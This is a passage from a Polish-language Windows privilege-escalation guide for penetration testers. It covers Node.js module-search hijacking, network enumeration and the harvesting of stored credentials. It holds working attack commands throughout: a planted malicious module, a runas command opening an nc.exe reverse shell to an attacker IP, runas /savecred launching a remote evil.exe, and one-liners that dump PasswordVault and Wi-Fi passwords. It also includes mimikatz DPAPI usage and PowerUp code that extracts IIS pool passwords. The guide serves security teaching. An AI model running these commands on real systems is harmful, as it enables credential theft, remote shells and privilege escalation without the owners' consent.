for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak wykorzystać tę kontrolę:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bezpośredni, taki jak `require("foo")`, a oczekiwany moduł **nie istnieje**.<sup>[[20]](#references)</sup>

Node wyszukuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W systemie Windows wyszukiwanie może dotrzeć do katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik z niskimi uprawnieniami** może utworzyć `C:\node_modules`, może umieścić w nim złośliwy plik `foo.js` (lub folder pakietu) i poczekać, aż **proces Node/Electron z wyższymi uprawnieniami** spróbuje rozwiązać brakującą zależność. Payload zostanie uruchomiony w kontekście bezpieczeństwa procesu ofiary, co prowadzi do **LPE**, gdy proces docelowy działa jako administrator, jest uruchamiany przez zadanie harmonogramu z podwyższonymi uprawnieniami lub wrapper usługi albo jest uprzywilejowaną aplikacją pulpitu uruchamianą automatycznie.

Jest to szczególnie częste, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet został usunięty z kompilacji produkcyjnych, pominięty podczas pakowania lub nie udało się go zainstalować
- podatne wywołanie `require()` znajduje się głęboko w drzewie zależności, a nie w kodzie głównej aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania:<sup>[[23]](#references)</sup>

- Ustaw filtr `Process Name` = plik wykonywalny procesu docelowego (`node.exe`, plik EXE aplikacji Electron lub proces wrappera)
- Ustaw filtr `Path` `contains` `node_modules`
- Skup się na zdarzeniach `NAME NOT FOUND` i ostatnim udanym otwarciu w `C:\node_modules`

Przydatne wzorce do wyszukania w kodzie źródłowym aplikacji lub rozpakowanych plikach `.asar`:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Zidentyfikuj **brakującą nazwę pakietu** na podstawie Procmon lub przeglądu kodu źródłowego.
2. Utwórz katalog wyszukiwania w katalogu głównym, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł o dokładnie oczekiwanej nazwie:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a prawidłowego modułu brakuje, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących modułów opcjonalnych pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technika** jest uniwersalna: znajdź dowolny **brakujący import bezwzględny**, który uprzywilejowany proces Node/Electron w systemie Windows rozwiąże.

### Wskazówki dotyczące wykrywania i hardeningu

- Generuj alert, gdy użytkownik utworzy `C:\node_modules` lub zapisze tam nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokim poziomie integralności odczytujące dane z `C:\node_modules\*`.
- W środowisku produkcyjnym dołączaj wszystkie zależności środowiska uruchomieniowego i kontroluj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}` ignorujących błędy.
- Wyłączaj opcjonalne sprawdzanie, jeśli biblioteka to umożliwia (na przykład niektóre wdrożenia `ws` mogą pominąć starsze sprawdzanie `utf-8-validate`, ustawiając `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts są zakodowane na stałe adresy innych znanych komputerów.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz, czy dostępne są **usługi z ograniczonym dostępem**.

```bash
netstat -ano #Opened ports?
```

W przypadku lokalnego listenera powiąż jego PID z właścicielem procesu, ścieżką do pliku wykonywalnego oraz usługą lub zaplanowanym zadaniem, które go uruchamia. Usługa zdalnego sterowania może zapewniać dostęp jako jej użytkownik desktopowy tylko wtedy, gdy pozwalają na to mechanizmy uwierzytelniania i kontroli poleceń. Niestandardowa aplikacja TCP działająca na koncie z wyższymi uprawnieniami wymaga osobnej analizy: listener i ścieżka do pliku binarnego to jedynie pasywne wskazówki, natomiast uwierzytelniona ścieżka wykorzystująca błąd uszkodzenia pamięci wymaga analizy dokładnie tego pliku binarnego i dostępnego dla niego wejścia. Jeśli wystawiony port wydaje się należeć do procesu systemowego, porównaj go z wynikiem polecenia [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), zanim przypiszesz go do usługi backendowej; sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na ataki.

### Tabela routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory

[**Sprawdź tę stronę, aby poznać polecenia związane z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej[ poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Plik binarny `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszej próbie nasłuchiwania na porcie za pomocą `nc.exe` pojawi się okno dialogowe z pytaniem, czy `nc` ma być dozwolone przez zaporę).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Uprawnienia `root` w systemie Linux uruchomionym w WSL same w sobie nie dają uprawnień Administratora w systemie Windows. Jeśli bieżąca tożsamość Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać dane uwierzytelniające. Eskalacja nadal wymaga prawidłowego konta o wyższych uprawnieniach oraz dozwolonej ścieżki uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; WSL 2 zwykle przechowuje dystrybucję na [wirtualnym dysku `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal faktyczną dystrybucję i ścieżkę jej przechowywania. Unikaj wyświetlania zawartości historii podczas automatycznego wyliczania.

## Poświadczenia Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie poświadczenia. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza, że w rejestrze znaleziono hasło w postaci jawnego tekstu. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła w postaci jawnego tekstu, jest to tylko wskazówka: [Sysinternals Autologon może przechowywać hasło jako LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy taki sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia poświadczeń sprawdź prawa dostępu i rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników dotyczące serwerów, witryn internetowych i innych programów, których **Windows** może używać do **automatycznego logowania użytkowników**. Na początku może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter czy Gmail, aby przeglądarki logowały się automatycznie, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja Windows wymagająca poświadczeń w celu uzyskania dostępu do zasobu** (serwera lub witryny internetowej) **może korzystać z tego Credential Manager** i Windows Vault oraz używać podanych poświadczeń, zamiast za każdym razem prosić użytkowników o podanie nazwy użytkownika i hasła.

O ile aplikacje nie współpracują z Credential Manager, nie sądzę, aby mogły używać poświadczeń dla danego zasobu. Jeśli więc aplikacja ma korzystać z vault, powinna w jakiś sposób **komunikować się z menedżerem poświadczeń i żądać poświadczeń dla tego zasobu** z domyślnego vault.

Użyj `cmdkey`, aby wyświetlić listę poświadczeń przechowywanych na komputerze.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanymi poświadczeniami.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Pamiętaj, że możesz użyć mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub modułu Powershell [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające i hasła w postaci jawnej w `PasswordVault` platformy Universal Windows Platform (UWP) (widocznym również jako `Web Credentials` w `vaultcmd`). Ten obszar magazynu jest odizolowany dla sesji i można go odszyfrować natywnie bez uprawnień administratora ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników i hasła w postaci jawnej:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** udostępnia metodę symetrycznego szyfrowania danych, wykorzystywaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który w znacznym stopniu zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z danych logowania użytkownika**. W przypadku szyfrowania systemu wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkownika, chronione przez DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [identyfikator zabezpieczeń](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, znajdujący się w tym samym pliku co klucz główny chroniący klucze prywatne użytkownika**, zazwyczaj składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlenie jego zawartości za pomocą polecenia `dir` w CMD, choć można ją wyświetlić w PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć modułu **mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zazwyczaj znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane w **skryptach** i zadaniach automatyzacji jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Są one chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko na tym samym komputerze i przez tego samego użytkownika, który je utworzył.

Wyeksportowane poświadczenie może mieć dowolną nazwę pliku lub ścieżkę `.xml`. Jeśli wskazuje na nie skrypt lub inwentaryzacja plików, ustal rzeczywisty katalog profilu konta zamiast zakładać, że znajduje się on w `C:\Users`: [system Windows może przechowywać profile w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Czytelny plik to jedynie wskazówka; [funkcja Windows `Export-Clixml` wiąże zaszyfrowane poświadczenie z użytkownikiem i komputerem, z których zostało wyeksportowane](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a każde odzyskane konto musi osobno mieć odpowiednie uprawnienia do użycia docelowej usługi. Najpierw sprawdź ścieżki i ACL, nie wyświetlając podczas rutynowej inwentaryzacji zaszyfrowanych ani jawnych wartości.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń Pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu **Mimikatz** `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwykłych nazwach, takie jak `config.xml`. Zidentyfikuj schemat połączeń i zaszyfrowane atrybuty `Password`, zanim potraktujesz plik XML jako potencjalne źródło danych uwierzytelniających. Przechowywana wartość nie jest hasłem DPAPI/RDCMan; możliwość jej odzyskania zależy od ustawień szyfrowania pliku oraz od tego, czy użyto niestandardowego hasła głównego. Podczas szerokiego wyszukiwania unikaj wyświetlania zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** mogą być również czytelne w katalogach użytkownika lub współdzielonym folderze administracyjnym. Starszy eksport `profiles.xml` zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Potraktuj niepusty element hasła jako potencjalne źródło danych uwierzytelniających, ale go nie wyświetlaj ani nie zakładaj, że zawiera tekst jawny: [informacje od dostawcy](https://www.donkz.nl/) wskazują, że ochrona profilu może być powiązana z kontem i komputerem, na których go utworzono, albo skonfigurowana mniej rygorystycznie. Przed poleganiem na tych danych potwierdź pochodzenie pliku i warunki odzyskiwania.

### Sticky Notes

Ludzie czasami zapisują hasła i inne informacje w aplikacjach z karteczkami samoprzylepnymi. Aplikacja Sticky Notes firmy Microsoft, dystrybuowana jako pakiet, zwykle przechowuje notatki w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą używać innych magazynów w profilu użytkownika, w tym LevelDB. Zidentyfikuj zainstalowaną aplikację i format przechowywania, zanim uznasz brak pliku SQLite za brak notatek.

Jeśli Sticky Notes korzysta z dziennika zapisu z wyprzedzeniem SQLite, sama kopia `plum.sqlite` może nie zawierać ostatnio zatwierdzonych notatek. Zachowaj pasujący plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych i dołącz `plum.sqlite-shm`, jeśli jest dostępny; indeks pamięci współdzielonej można odbudować, ale WAL jest częścią trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatka zawierająca nazwę konta lub hasło jest jedynie potencjalnym źródłem danych uwierzytelniających: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany rekord menedżera haseł wymaga ponadto właściwego klucza deszyfrującego i interpretacji właściwej dla aplikacji, zanim będzie można uznać go za potwierdzenie logowania na konto o wyższych uprawnieniach.

### AppCmd.exe

**Pamiętaj, że aby odzyskać hasła z AppCmd.exe, musisz mieć uprawnienia Administratora i uruchomić program na poziomie High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano pewne **dane uwierzytelniające**, które można **odzyskać**.

Ten kod pochodzi z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM, wiele z nich jest podatnych na **DLL Sideloading (Informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (dane uwierzytelniające)

### Artefakty danych uwierzytelniających w rejestrze narzędzi wsparcia

Niektóre starsze instalacje narzędzi do zdalnego wsparcia zachowują nazwy wartości związane z hasłami pod stałymi kluczami rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewer wskazywał skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w postaci nazwy wartości to jedynie wskazówka do dalszej weryfikacji: przed oceną tych danych uwierzytelniających sprawdź zainstalowaną wersję, możliwość odczytu danych wartości, ich format oraz bieżące działanie uwierzytelniania. Przejście od hasła do zdalnego wsparcia do bardziej uprzywilejowanego konta Windows wymaga również faktycznego ponownego użycia hasła i uprawnień do tego konta. Nie umieszczaj tekstu zaszyfrowanego ani odzyskanych haseł w standardowych wynikach enumeracji.

### Udostępnione arkusze kalkulacyjne z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny, udostępniony skoroszyt zawiera dane kont, rozróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft informuje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje możliwość edycji i nie jest funkcją bezpieczeństwa; sama w sobie nie oznacza, że zawartość skoroszytu jest zaszyfrowana. Sprawdzaj wyłącznie pliki, do których masz uprawnienia i które są istotne, oraz unikaj wyświetlania potencjalnych sekretów podczas szeroko zakrojonej enumeracji. Sama ścieżka do czytelnego pliku `.xlsx`, chroniony arkusz ani ukryta kolumna nie dowodzą, że istnieją tam dane uwierzytelniające lub że jakiekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj faktyczne dane i bieżące uprawnienia kont.

### Zachowane poprawki zmian serwera CI

Serwer CI może zachowywać przesłane zmiany w kodzie źródłowym w swoim katalogu danych nawet po zakończeniu kompilacji. [TeamCity opisuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` jako miejsce przechowywania zmian z remote-run; katalog danych można skonfigurować i nie musi on znajdować się w `ProgramData`. Czytelna poprawka może zachować usunięte lub dodane odwołania do pliku z danymi uwierzytelniającymi, klucza szyfrowania albo skryptu używającego obu tych elementów. Na przykład w procesie PowerShell `ConvertTo-SecureString -Key` potrzebny jest zarówno klucz AES, jak i zaszyfrowany ciąg znaków; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest podawany osobno. Najpierw sprawdzaj wyłącznie nazwy dostępnych poprawek, a następnie, w ramach posiadanych uprawnień, analizuj istotną zawartość, nie wyświetlając sekretów w standardowych wynikach enumeracji. Sama ścieżka do poprawki, zaszyfrowana wartość ani odwołanie do klucza nie dowodzą, że dane uwierzytelniające są prawidłowe lub zapewniają dostęp z wyższymi uprawnieniami. Ogranicz uprawnienia ACL katalogu danych i unikaj zatwierdzania sekretów w zmianach kodu kompilacji.

### Niestandardowa rotacja haseł lokalnego administratora

Samodzielnie opracowany mechanizm rotacji haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a dane uwierzytelniające do magazynu danych — w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Rozpatruj łącznie zaplanowane zadanie aktualizatora, konto, ACL konfiguracji, nasłuchujący proces i uprawnienia do magazynu danych. Magazyn danych dostępny wyłącznie przez loopback nadal jest osiągalny dla lokalnego użytkownika, który ma prawidłowe dane uwierzytelniające, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli materiał inicjujący szyfrowanie lub klucz jest dostępny obok zaszyfrowanego tekstu, przed zaufaniem szyfrowaniu sprawdź dokładny sposób wyprowadzania klucza. Schemat, który deterministycznie wyprowadza klucz AES z ujawnionego ziarna za pomocą [`math/rand`](https://pkg.go.dev/math/rand) Go, nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest odpowiedni do losowości wrażliwej z punktu widzenia bezpieczeństwa. Zanim uznasz odzyskane hasło za możliwą ścieżkę eskalacji, potwierdź, że jest aktualne i należy do konta należącego do lokalnej grupy Administrators. Samo zaplanowane zadanie, ścieżka do `.env` ani zaszyfrowany blob nie dowodzą żadnego z tych warunków. Nie umieszczaj haseł ani materiału klucza w standardowych wynikach enumeracji.

Do zarządzania hasłami lokalnych administratorów używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Jego magazyn w katalogu lub Entra oraz mechanizmy kontroli dostępu różnią się od niestandardowego lokalnego magazynu danych; podobnie [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) określają, czy uwierzytelniony użytkownik magazynu danych może odczytać konkretny indeks.

### Archiwa wtyczek serwera Java i ponowne użycie danych uwierzytelniających

Niektóre wtyczki serwera Java są rozpowszechniane jako archiwa JAR w katalogu `plugins` serwera. Czytelna niestandardowa wtyczka może zawierać konfigurację lub bytecode z osadzonymi danymi uwierzytelniającymi usługi. Analizuj archiwum wyłącznie za odpowiednim upoważnieniem i nie umieszczaj odzyskanych sekretów w standardowych wynikach enumeracji. Sama ścieżka do wtyczki nie dowodzi, że istnieje tam sekret, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla bardziej uprzywilejowanego konta. Sprawdź odpowiednie ACL plików i zastąp ponownie używane dane uwierzytelniające odrębnymi sekretami. Informacje o strukturze katalogów znajdziesz w [przewodniku instalacji wtyczek PaperMC](https://docs.papermc.io/paper/adding-plugins/), a o zawartości archiwów — w [dokumentacji JAR Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Dane uwierzytelniające wbudowanej bazy danych Openfire

Instalacja Openfire korzystająca z wbudowanej bazy danych może przechowywać plik `openfire.script` w katalogu `Openfire\embedded-db`. Jeśli bieżące konto może go odczytać, sprawdź łącznie rekordy `OFUSER` i właściwość `passwordKey`. Dokumentacja [dostawcy użytkowników Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) podaje, że hasła mogą być przechowywane jako zwykły tekst lub zaszyfrowane kluczem zapisanym w tej właściwości. Odzyskane hasło ma znaczenie dla eskalacji tylko wtedy, gdy nadal jest prawidłowe dla bardziej uprzywilejowanej tożsamości; sama nazwa pliku nie dowodzi ani możliwości jego odczytu, ani ponownego użycia danych uwierzytelniających. Ta ścieżka jest wskazówką do inwentaryzacji, więc nie umieszczaj zawartości bazy danych ani danych uwierzytelniających w standardowych wynikach enumeracji.

